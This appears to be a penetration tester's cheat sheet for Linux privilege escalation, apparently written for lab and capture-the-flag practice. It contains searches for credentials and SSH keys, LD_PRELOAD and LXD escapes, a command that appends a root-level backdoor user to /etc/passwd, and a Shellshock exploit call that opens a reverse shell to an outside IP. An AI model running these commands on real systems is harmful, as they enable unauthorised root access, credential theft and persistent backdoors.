# Linux privilege escalation

## Enumeration is key (as always)

1. Start with low hanging fruits: just browse through file system and look for credentials and other sensible information
2. Enumerate user rights and groups 
3. Look for systems to mount and also enumerate them
4. Enumerate `sudo, SUID and GUID`
5. Enumerate programms running as root
6. Look for kernerl modules vulnerabilities
7. Finally, check if kernel version is vulnerable. Typically it iis the last thing to do because it can break the whole system.

### Key manual commands for enumeration

```bash 

# elevate to root using sudo
# (ALL : ALL) ALL
sudo -i

ps aux | grep root

#watch processes
watch -n 1 "ps -aux | grep pass"
./pspy32

#See logged in users
ps au	
ssh
# Check for SSH keys 
ls -l /root/.ssh	

# look for credentials and other infor in environmental variables
env
cat .bashrc

sudo -l	

# check for all cron jobs
ls -la /etc/cron*	
crontab -l
grep "CRON" /var/log/syslog
cat /var/log/cron.log

#Check for unmounted file systems/drives
lsblk	
cat /etc/fstab

# find writable files and direcrtories
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

# Find world-writeable directories
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null	

# Find world-writeable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null	

uname -a	

# Check the OS version
cat /etc/lsb-release	

# Check the installed version of Screen
screen -v	

# View running processes with pspy
./pspy64 -pf -i 1000	

# Find binaries with the SUID bit set
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null	

# Find binaries with the SETGID bit set
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null	

# find capabilities like SUID manually
/usr/sbin/getcap -r / 2>/dev/null

# Priv esc with tcpdump
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root	

# Check the current user's PATH variable contents
echo $PATH	
getenv

# Add a . to the beginning of the current user's PATH
PATH=.:${PATH}	

#Search for config files
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null	

# View the shared objects required by a binary
ldd /bin/ls	

#Escalate privileges using LD_PRELOAD
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart	

#Check the RUNPATH of a binary
readelf -d payroll | grep PATH	

#Compiled a shared libary
gcc src.c -fPIC -shared -o /development/libshared.so	

# Start the LXD initialization process
lxd init	

# Import a local image
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine	

#Start a privileged LXD container
lxc init alpine r00t -c security.privileged=true	

lxc config device add r00t mip a

# Mount the host file system in a container
ydev disk source=/ path=/mnt/root recursive=true	

# Start the container
lxc start r00t	

# Show the NFS export list
showmount -e 10.129.2.12	

# Mount an NFS share locally
sudo mount -t nfs 10.129.2.12:/tmp /mnt	

# Created a shared tmux session socket
tmux -S /shareds new -s debugsess	

# audit system	Perform a system audit with Lynis
./linpeas.sh 

#iptables fw rules
cat /etc/iptables/rules.v4

# loaded kernel modukes
lsmod

# get more info about some module
/sbin/mdinfo libdata
```



### Disclosed passwords or other credentials

* If it is webserver, first thing is to look for database credentials

```bash
cd config

grep -Ri password .
```

* Finding passwords using bash

```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

* Finding passwords using linenum

```bash
./LinEnum.sh -k password
```

* Finding ssh keys

```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```


### Cron services misconfigurations

`crontab -e` to edit crontab

```bash
# = ID

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as

command = What command should be run

For Example,

#   m   h dom mon dow user  command

17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly


```

## Automated enumeration

### unix-privesc-check

https://github.com/pentestmonkey/unix-privesc-check

`./upc standard`

### Linpeas

`./linpeas,sh`

## Utilities


* Supress messages from background process

<code>  bg_proc > /dev/null 2>&1 &   </code>



## exploiting /etc/passwd

### The structure of the passwd file is as follows

<code> oracle:x:1021:1021:Oracle Services:/data/network/oracle:/bin/bash </code>

* Each line of the passwd file represents a set of parameters belonging to a user
* Parameters are separated with :
* Each parameter position is described below (source: [cyberciti](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/))

1. **Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
2. **Password**: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file. Password hash may also be present here for backward compatibility, but it precedes the one in shadow file.
3. **User ID** (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. **Group ID** (GID): The primary group ID (stored in /etc/group file)
5. **User ID Info** (GECOS): The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell. For example, sysadmin can use the nologin shell, which acts as a replacement shell for the user accounts. If shell set to /sbin/nologin and the user tries to log in to the Linux system directly, the /sbin/nologin shell closes the connection.

### Use of passwd for privilege escalation

* privilege escalation on Linux may make use of passwd file if something can be appended to it (perform recon)
* For example kernel exploit can be compiled to execute arbitrary command to add a line to passwd file as root to make a hidden user with admin rights...

So to **make oracle user root account**, it is sufficient to add following line

<code> oracle:x:0:0::/:/bin/bash </code>

Additionally one may generate a password hash with crypt function and add it the second position instead of x. 

```bash
#POC for password generation and injection into /etc/passwd

openssl passwd w00t
#Fdzt.eqJQ4s0g

echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

su root2
w00t

id
```

<code> pentester:$1$2AL4ULeB$vPb2hnoy5xgsBueJSXTsj0:0:0::/:/bin/bash </code>
Password1

#### fast change password


`echo root:toor | chpasswd`

### Shadow file 

#### make shadow files

Generate shadow files ([stackoverflow](https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow)):

<code> openssl passwd -6 -salt xyz  yourpass </code>

Note: passing -1 will generate an MD5 password, -5 a SHA256 and -6 SHA512 (recommended)

To understand which hash you need, check what is $X$:

username:$X$salt$pass....

* $1$ is MD5
* $2a$ is Blowfish
* $2y$ is Blowfish
* $5$ is SHA-256
* $6$ is SHA-512

AND dont forget salt!

#### crack shadow file

1. copy and unshadow
2. crack with john 


## Post Exploitation

https://guif.re/linuxeop#Post%20exploitation


## Diverse Other exploits

### Shell Shock 

* spot /cgi-bin
* dirbust .sh .cgi or some more exotic script files in it 
* use 34766.php

`php 34766.php -u http://shocker.htb/cgi-bin/user.sh -c "sh -i >& /dev/tcp/10.10.14.18/443 0>&1" `

### Breaking out of restricted shell using vim

```bash
vim
:set shell=/bin/sh
:shell
```
